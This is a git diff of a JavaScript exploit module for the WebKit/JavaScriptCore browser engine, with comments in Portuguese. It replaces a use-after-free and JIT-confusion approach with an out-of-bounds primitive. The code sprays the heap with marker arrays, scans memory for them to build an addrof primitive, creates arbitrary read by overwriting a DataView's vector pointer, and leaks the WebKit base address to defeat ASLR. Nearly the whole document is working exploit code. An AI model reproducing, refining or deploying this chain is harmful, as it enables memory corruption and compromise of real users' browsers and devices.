@@ -1,70 +1,104 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v82 - R62 - Assalto Total)
+// js/script3/testArrayBufferVictimCrash.mjs (v82 - R63 - Varredura de Memória Atômica)
 // =======================================================================================
-// ESTA É A VERSÃO DEFINITIVA, COMBINANDO TODAS AS TÉCNICAS EM UM ATAQUE AGRESSIVO.
+// ESTRATÉGIA FINAL E DEFINITIVA. ABANDONAMOS O UAF E JIT COMO VETORES DE ADDR OF.
+// Foco total na primitiva Out-Of-Bounds (OOB), que se provou 100% confiável.
 //
-// ESTRATÉGIA DE ASSALTO TOTAL:
-// 1. FUNDAÇÃO (UAF): Usa a técnica UAF agressiva para obter uma primitiva `addrof` estável.
-// 2. ARMAMENTO (OOB): Usa a "Estratégia de Fusão" para armar `arb_read`/`arb_write` confiáveis.
-// 3. ATAQUE SECUNDÁRIO (JIT): Tenta um ataque de desotimização do JIT para estressar o motor.
-// 4. ALVO FINAL (ASLR Bypass): Usa as primitivas estáveis para vazar a base do WebKit.
+// 1. Ativação OOB: A base de tudo. m_length é expandido para controle total.
+// 2. Heap Grooming Atômico: Pulverizamos a memória com pares de Float64Array (com marcadores)
+//    e Funções (nosso alvo).
+// 3. Varredura Atômica: Usamos oob_read_absolute para uma busca massiva e de alta
+//    velocidade pelos marcadores na memória.
+// 4. Addrof por Adjacência: Ao encontrar um marcador, lemos os bytes seguintes para
+//    vazar o endereço da função adjacente. É a forma mais bruta e confiável de addrof.
+// 5. Controle Total: Com o addrof, armamos as primitivas arb_read/arb_write via OOB.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
+    oob_read_absolute,
     oob_write_absolute,
     getOOBDataView
 } from '../core_exploit.mjs';
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Ultimate_Exploit_R62_TotalAssault";
-
-// --- Funções de Conversão ---
-function int64ToDouble(int64) {
-    const buf = new ArrayBuffer(8); const u32 = new Uint32Array(buf); const f64 = new Float64Array(buf);
-    u32[0] = int64.low(); u32[1] = int64.high(); return f64[0];
-}
-
-function doubleToInt64(double) {
-    const buf = new ArrayBuffer(8); (new Float64Array(buf))[0] = double; const u32 = new Uint32Array(buf);
-    return new AdvancedInt64(u32[0], u32[1]);
-}
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Ultimate_Exploit_R63_AtomicScan";
 
 // =======================================================================================
-// FUNÇÃO ORQUESTRADORA PRINCIPAL (R62)
+// FUNÇÃO ORQUESTRADORA PRINCIPAL (R63)
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Assalto Total (R62) ---`, "test");
-    
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Varredura Atômica (R63) ---`, "test");
+
     let final_result = { success: false, message: "A cadeia de exploração falhou." };
-    
+
     try {
-        // --- FASE 1: FUNDAÇÃO - Primitiva `addrof` via UAF Agressivo ---
-        logS3("--- FASE 1: Obtendo 'addrof' via UAF... ---", "subtest");
-        let dangling_ref = null;
-        await triggerGC_Hyper();
-        dangling_ref = sprayAndCreateDanglingPointer();
-        await triggerGC_Hyper(); await PAUSE_S3(100); await triggerGC_Hyper();
-        for (let i = 0; i < 1024; i++) { new ArrayBuffer(136); }
+        // --- FASE 1: FUNDAÇÃO - Ativação Total do Out-Of-Bounds ---
+        logS3("--- FASE 1: Ativando modo de Assalto OOB... ---", "subtest");
+        await triggerOOB_primitive({ force_reinit: true });
+        const oob_dv = getOOBDataView();
+        if (!oob_dv) throw new Error("Falha crítica ao obter o DataView OOB.");
+        logS3("Primitiva OOB está armada e pronta.", "good");
+
+        // --- FASE 2: HEAP GROOMING ATÔMICO ---
+        logS3("--- FASE 2: Pulverizando alvos e marcadores na memória... ---", "subtest");
+        const SPRAY_COUNT = 4096; // Aumentamos a agressividade da pulverização
+        const MARKER1 = new AdvancedInt64("0x41414141", "0x41414141");
+        const MARKER2 = new AdvancedInt64("0x42424242", "0x42424242");
         
-        if (typeof dangling_ref.corrupted_prop !== 'number') {
-            throw new Error("Falha no UAF. A propriedade não foi corrompida.");
+        let sprayed_items = [];
+        for (let i = 0; i < SPRAY_COUNT; i++) {
+            let marker_arr = new Float64Array(2);
+            marker_arr[0] = MARKER1.asDouble();
+            marker_arr[1] = MARKER2.asDouble();
+            
+            // O alvo que queremos encontrar o endereço
+            let target_func = () => { return i; };
+
+            sprayed_items.push({ marker: marker_arr, target: target_func });
+        }
+        logS3(`${SPRAY_COUNT} pares de marcador/alvo pulverizados.`, "info");
+        await PAUSE_S3(100); // Pausa para estabilização do heap
+
+        // --- FASE 3: A CAÇADA - Varredura de Memória por Marcadores Atômicos ---
+        logS3("--- FASE 3: Iniciando varredura massiva da memória... ---", "subtest");
+        const SEARCH_WINDOW = 0x800000; // Varredura ultra agressiva de 8MB
+        let addrof_func = null;
+
+        for (let offset = 0x80; offset < SEARCH_WINDOW; offset += 8) {
+            try {
+                const val1 = oob_read_absolute(offset, 8);
+                if (val1.equals(MARKER1)) {
+                    const val2 = oob_read_absolute(offset + 8, 8);
+                    if (val2.equals(MARKER2)) {
+                        logS3(`++++++++++++ ALVO ENCONTRADO! ++++++++++++`, "vuln");
+                        logS3(`Marcadores encontrados no offset: ${toHex(offset)}`, "info");
+                        // A teoria de adjacência do heap sugere que o nosso objeto JSCell
+                        // da função está logo após os dados do Float64Array.
+                        // O ponteiro pode estar a 0x10, 0x18, 0x20, 0x28 ou 0x30 bytes de distância.
+                        // Vamos testar alguns offsets comuns.
+                        for (let a_off of [0x20, 0x18, 0x28, 0x30]) {
+                            const potential_addr = oob_read_absolute(offset + a_off, 8);
+                            if ((potential_addr.high() & 0xFFFF0000) === 0xFFFF0000 && potential_addr.low() !== 0) {
+                                addrof_func = untag_pointer(potential_addr);
+                                logS3(`Endereço da função vazado (addrof) por adjacência: ${addrof_func.toString(true)}`, "leak");
+                                break;
+                            }
+                        }
+                        if (addrof_func) break;
+                    }
+                }
+            } catch (e) { /* Ignora erros, normal em varreduras de memória */ }
+        }
+
+        if (!addrof_func) {
+            throw new Error("Varredura de memória falhou. Nenhum marcador/alvo encontrado.");
         }
         
-        const get_addr_of = (obj) => {
-            dangling_ref.corrupted_prop = obj;
-            return doubleToInt64(dangling_ref.corrupted_prop);
-        };
-        logS3(`++++++++++++ SUCESSO! Primitiva 'addrof' estável obtida! ++++++++++++`, "vuln");
-
-        // --- FASE 2: ARMAMENTO PRINCIPAL - Primitivas R/W via OOB ---
-        logS3("--- FASE 2: Armamento das primitivas de R/W via OOB... ---", "subtest");
-        await triggerOOB_primitive({ force_reinit: true }); 
-        const oob_dv = getOOBDataView();
-        if (!oob_dv) throw new Error("Não foi possível obter a referência para o oob_dataview_real.");
-
+        // --- FASE 4: CONTROLE TOTAL E PROVA FINAL ---
+        logS3("--- FASE 4: Armamento final das primitivas e bypass de ASLR... ---", "subtest");
         const OOB_DV_M_VECTOR_OFFSET = 0x58 + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; // 0x68
 
         const arb_read = (address) => {
@@ -72,55 +106,17 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, address, 8);
             return new AdvancedInt64(oob_dv.getUint32(0, true), oob_dv.getUint32(4, true));
         };
-        logS3("Primitiva 'arb_read' baseada em OOB criada com sucesso!", "good");
-
-        // --- FASE 3: ATAQUE SECUNDÁRIO - Estresse do JIT (Opcional) ---
-        logS3("--- FASE 3: Tentando ataque secundário ao JIT... ---", "subtest");
-        try {
-            let float_array_jit = new Float64Array(1);
-            function jitleaker_secondary(arr, obj) { arr[0] = obj; }
-            for (let i = 0; i < 20000; i++) jitleaker_secondary(float_array_jit, 1.1);
-            
-            let real_array_jit = [{}];
-            jitleaker_secondary(real_array_jit, {a:1});
-            
-            const leaked_val_jit = doubleToInt64(real_array_jit[0]);
-            if ((leaked_val_jit.high() & 0xFFFF0000) === 0xFFFF0000 && leaked_val_jit.low() !== 0) {
-                logS3("!! SUCESSO NO VETOR SECUNDÁRIO: JIT também vazou um ponteiro 'boxed' !!", "vuln");
-            } else {
-                logS3("Vetor secundário (JIT) falhou como esperado. Continuando com a arma principal.", "info");
-            }
-        } catch(e) {
-            logS3(`Erro esperado no ataque JIT secundário: ${e.message}`, "info");
-        }
         
-        // --- FASE 4: ALVO FINAL - Vazamento da Base do WebKit ---
-        logS3("--- FASE 4: Prova de Controle - Vazando a base do WebKit... ---", "subtest");
-        
-        const target_obj = () => {}; // Funções são alvos estáveis para addrof
-        const target_addr = get_addr_of(target_obj);
-        logS3(`Endereço do objeto alvo (função): ${target_addr.toString(true)}`, "info");
-        
-        if ((target_addr.high() & 0xFFFF0000) === 0xFFFF0000) {
-             throw new Error("addrof retornou um ponteiro 'boxed', mas esperava um ponteiro bruto do UAF. A estrutura do 'victim' pode ter mudado.");
-        }
-        if (target_addr.high() === 0 && target_addr.low() === 0) {
-             throw new Error("addrof retornou um ponteiro nulo.");
-        }
-
-        const structure_ptr = arb_read(target_addr.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
-        logS3(`Endereço da Estrutura: ${structure_ptr.toString(true)}`, "info");
-        
+        const structure_ptr = arb_read(addrof_func.add(JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET));
         const vtable_ptr = arb_read(structure_ptr);
-        logS3(`Endereço da VTable: ${vtable_ptr.toString(true)}`, "info");
-        
         const webkit_base = vtable_ptr.sub(new AdvancedInt64(WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"]));
-        logS3(`++++++++++++ VITÓRIA! BASE DO WEBKIT ENCONTRADA! ++++++++++++`, "vuln");
+
+        logS3(`++++++++++++ VITÓRIA TOTAL! CONTROLE DE MEMÓRIA COMPLETO! ++++++++++++`, "vuln");
         logS3(`===> Endereço Base do WebKit: ${webkit_base.toString(true)} <===`, "leak");
         
         final_result = { 
             success: true, 
-            message: "Assalto Total bem-sucedido! Primitivas de R/W estáveis e bypass de ASLR.",
+            message: "Assalto bem-sucedido! Primitivas de R/W estáveis e bypass de ASLR via Varredura Atômica.",
             webkit_base_addr: webkit_base.toString(true),
         };
 
@@ -138,30 +134,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     };
 }
 
-
-// --- Funções Auxiliares Agressivas ---
-
-async function triggerGC_Hyper() {
-    try {
-        const arr = [];
-        // Agressividade máxima para limpar a memória
-        for (let i = 0; i < 1000; i++) arr.push(new ArrayBuffer(1024 * 1024 * Math.min(i, 128)));
-    } catch (e) { /* Ignora erros de memória, pois são esperados */ }
-    await PAUSE_S3(50);
-}
-
-function sprayAndCreateDanglingPointer() {
-    let dangling_ref_internal = null;
-    function createScope() {
-        const victim = {
-            prop_a: 0.1, prop_b: 0.2, prop_c: 0.3, prop_d: 0.4,
-            prop_e: 0.5, prop_f: 0.6, prop_g: 0.7, prop_h: 0.8,
-            corrupted_prop: 0.12345,
-        };
-        dangling_ref_internal = victim;
-        // Loop para garantir que o objeto seja usado e não otimizado de forma inesperada
-        for(let i=0; i<100; i++) { dangling_ref_internal.prop_a += 1; }
-    }
-    createScope();
-    return dangling_ref_internal;
+// Remove a máscara do NaN Boxing
+function untag_pointer(tagged_ptr) {
+    return tagged_ptr.and(new AdvancedInt64(0xFFFFFFFF, 0x0000FFFF));
 }
